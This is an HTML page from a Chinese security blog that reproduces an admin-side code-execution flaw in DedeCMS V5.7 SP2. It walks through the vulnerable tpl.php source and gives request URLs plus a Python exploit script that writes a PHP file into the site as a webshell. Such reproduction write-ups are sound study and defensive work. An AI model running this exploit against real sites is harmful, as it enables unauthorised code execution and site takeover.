@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+     N0puple
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/001.ico">
+    <link rel="icon" href="/images/001.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">N0puple</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">朋友</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title"></div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-06-26 20:56:47
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">title: DedeCMS V5.7 SP2后台代码执行漏洞复现</span><br><span class="line">date: 2021-06-26 22:28:46</span><br><span class="line">categories:</span><br><span class="line">- 漏洞复现</span><br><span class="line">tags: </span><br><span class="line">- dedecms</span><br><span class="line">- php</span><br><span class="line">- 代码执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。Dedecms V5.7 SP2版本中的 tpl.php 中存在代码执行漏洞，可以通过该漏洞在增加新标签中上传木马，获取webshell。该漏洞利用需要登录后台,并且后台的账户权限是管理员权限。</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>DedeCMS V5.7 SP2</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>此漏洞位于后台，因此我们需要先登录到后台</p>
+<p>默认后台地址 dede/ ，先按照网上已有的文章复现</p>
+<p>先获取 token</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;dede&#x2F;tpl.php?action&#x3D;upload</span><br></pre></td></tr></table></figure>
+
+<p>得到 token</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33980963afa91dcc6c2f1efceefc87b0</span><br></pre></td></tr></table></figure>
+
+<p>然后访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;dede&#x2F;tpl.php?filename&#x3D;secnote.lib.php&amp;action&#x3D;savetagfile&amp;content&#x3D;&lt;?php phpinfo();?&gt;&amp;token&#x3D;33980963afa91dcc6c2f1efceefc87b0</span><br></pre></td></tr></table></figure>
+
+<p>这时就已经写入了 webshell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dedecms521.com&#x2F;include&#x2F;taglib&#x2F;secnote.lib.php</span><br></pre></td></tr></table></figure>
+
+<p>![image-20210626220121525](G:\我的笔记\blog\source_posts\DedeCMS V5.7 SP2后台代码执行漏洞复现.assets\image-20210626220121525.png)</p>
+<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>根据上面的漏洞复现，我们知道问题在文件 dede/tpl.php</p>
+<p>可以看到，tpl.php 中是根据 action 进行不同的动作，我们定位到我们的目标 action，savetagfile 内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">csrf_check();</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;</span>, <span class="variable">$filename</span>))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">&#x27;文件名不合法，不允许进行操作！&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require_once</span>(DEDEINC.<span class="string">&#x27;/oxwindow.class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$tagname</span> = preg_replace(<span class="string">&quot;#\.lib\.php$#i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$content</span> = stripslashes(<span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$truefile</span> = DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="variable">$truefile</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$content</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;...&quot;</span>;</span><br><span class="line"><span class="variable">$wintitle</span> = <span class="string">&quot;成功修改/创建文件！&quot;</span>;</span><br><span class="line"><span class="variable">$wecome_info</span> = <span class="string">&quot;&lt;a href=&#x27;templets_tagsource.php&#x27;&gt;标签源码碎片管理&lt;/a&gt; &amp;gt;&amp;gt; 修改/新建标签&quot;</span>;</span><br><span class="line"><span class="variable">$win</span> = <span class="keyword">new</span> OxWindow();</span><br><span class="line"><span class="variable">$win</span>-&gt;AddTitle(<span class="string">&quot;修改/新建标签：&quot;</span>);</span><br><span class="line"><span class="variable">$win</span>-&gt;AddMsgItem(<span class="variable">$msg</span>);</span><br><span class="line"><span class="variable">$winform</span> = <span class="variable">$win</span>-&gt;GetWindow(<span class="string">&quot;hand&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$win</span>-&gt;Display();</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+
+<p>csrf_check 函数内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$token</span>) || strcasecmp(<span class="variable">$token</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就需要一个 $token，而我们怎样给 $token 赋值呢</p>
+<p>tpl.php 中请求了一次 config.php，config.php 中又请求了一次 include/common.inc.php</p>
+<p>在该文件的 109 行，这里将 GET，POST，COOKIE 传进来的值全都转换成了变量，这样的处理设置很容易造成变量覆盖等问题，比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&#39;token&#39;] &#x3D; &#39;aaaaaa&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>那么就会得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$token &#x3D; &#39;aaaaaa&#39;;</span><br></pre></td></tr></table></figure>
+
+<p>因此这里我们就很容易给 $token 赋值，至于找到 token ，就属于比较简单的事情了，之前的复现也给我们提供了一种方法</p>
+<p>接下来是 $filename，只要满足 xxxx.lib.php 就行，也可以通过 GET等方式传值进来</p>
+<p>再然后是这几行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tagname</span> = preg_replace(<span class="string">&quot;#\.lib\.php$#i&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$content</span> = stripslashes(<span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$truefile</span> = DEDEINC.<span class="string">&#x27;/taglib/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="variable">$truefile</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p>$filename 赋值给 $tagname，$content 也可以像之前一样传值进来</p>
+<p>$truefile 就是最终的 webshell 位置，最后直接写入，实现代码执行</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;menuitems&#x27;</span>: <span class="string">&#x27;1_1%2C2_1%2C3_1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;03vl33l9qoqgkud8lotrjqao61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_csrf_name_038be8bf&#x27;</span>: <span class="string">&#x27;0bfdaa5a43a74e6a73c647bd6bccea74&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_csrf_name_038be8bf__ckMd5&#x27;</span>: <span class="string">&#x27;abc564ee99b944d5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeUserID&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeUserID__ckMd5&#x27;</span>: <span class="string">&#x27;d217f47f5438b1c4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeLoginTime&#x27;</span>: <span class="string">&#x27;1624719766&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;DedeLoginTime__ckMd5&#x27;</span>: <span class="string">&#x27;8f80d0af54e33e54&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span>(<span class="params">url</span>):</span></span><br><span class="line">    uploadurl = url + <span class="string">&#x27;/dede/tpl.php?action=upload&#x27;</span></span><br><span class="line">    html = s.get(uploadurl, cookies=cookies).text</span><br><span class="line">    token = re.findall(<span class="string">&quot;&lt;input name=&#x27;token&#x27; type=&#x27;hidden&#x27; value=&#x27;(.*?)&#x27;&quot;</span>, html)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getShell</span>(<span class="params">url, token</span>):</span></span><br><span class="line">    getshellurl = url + <span class="string">&#x27;/dede/tpl.php?action=savetagfile&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;shell.lib.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    s.post(getshellurl, data=data, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">url</span>):</span></span><br><span class="line">    shellurl = url + <span class="string">&#x27;/include/taglib/shell.lib.php&#x27;</span></span><br><span class="line">    html = s.get(shellurl, cookies=cookies).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;PHP Version&#x27;</span> <span class="keyword">in</span> html:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] getshell success &quot;</span> + shellurl)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] getshell error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/dedecms&#x27;</span></span><br><span class="line">    token = getToken(url)</span><br><span class="line">    getShell(url, token)</span><br><span class="line">    check(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>需要替换自己进入后台之后的 cookies</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这个漏洞只是 dede 提供的一个文件管理的功能，但是被利用了，基本上只要进到后台，利用这个还是很容易getshell的。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/04/21/laravel-RCE5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-06-26 20:56:47
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="toc-text">漏洞影响</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%86%E8%8A%82"><span class="toc-text">漏洞细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/N0puple/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="tudouqunaliwa@163.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/N0puple/">Copyright © N0puple 2020</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
